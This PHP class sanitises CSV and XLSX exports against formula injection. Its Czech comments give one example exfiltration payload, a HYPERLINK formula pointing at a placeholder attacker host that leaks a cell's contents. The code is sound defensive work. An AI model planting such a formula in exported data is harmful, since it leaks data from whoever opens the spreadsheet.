<?php

declare(strict_types=1);

namespace ADT\Datagrid\Model\Export;

/**
 * Ochrana exportu pred formula injection (CSV injection, CWE-1236).
 *
 * Tabulkove procesory povazuji hodnotu bunky za vzorec, kdyz zacina na "=", "+", "-", "@",
 * tabulator nebo CR. Uzivatel, ktery umi pojmenovat produkt nebo kategorii, tak umi do cizim
 * exportu propasovat treba =HYPERLINK("http://utocnik/?"&A2,"Klikni") a odnest si data.
 *
 * XLSX a CSV se proti tomu brani jinak a je to zamerne:
 *
 * - XLSX ma vzorec dany strukturou souboru (element <f>), ne obsahem retezce. Staci tedy
 *   hodnotu zapsat jako inline string a text zustane presne takovy, jaky byl - viz
 *   Excel\SafeXlsxWriter. Zadna uprava hodnoty neni potreba.
 * - CSV zadnou strukturu nema, vzorec si urcuje Excel sam pri parsovani. Tam uz hodnotu
 *   zmenit musime, a jedina obrana je uvodni apostrof (doporuceni OWASP). Excel ho pri
 *   otevreni spolkne a bunku zobrazi jako text, jinym ctecim nastrojum ale v datech zustane.
 */
final class FormulaGuard
{
	private const array DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

	public static function escape(string $value): string
	{
		// Zaporna cisla a telefony s predvolbou zacinaji na "-" resp. "+", ale vzorec z nich
		// nikdy nebude. Bez teto vyjimky by se kazda zaporna castka ve skladovem reportu
		// zmenila na text a sloupec by prestal jit secist.
		if ($value === '' || is_numeric($value)) {
			return $value;
		}

		return in_array($value[0], self::DANGEROUS_PREFIXES, true) ? "'" . $value : $value;
	}

	/**
	 * @param array<int|string, array<int|string, mixed>> $rows
	 * @return array<int|string, array<int|string, mixed>>
	 */
	public static function escapeRows(array $rows): array
	{
		$escaped = [];

		foreach ($rows as $rowKey => $row) {
			$escapedRow = [];

			foreach ($row as $cellKey => $value) {
				$escapedRow[$cellKey] = is_string($value) ? self::escape($value) : $value;
			}

			$escaped[$rowKey] = $escapedRow;
		}

		return $escaped;
	}
}
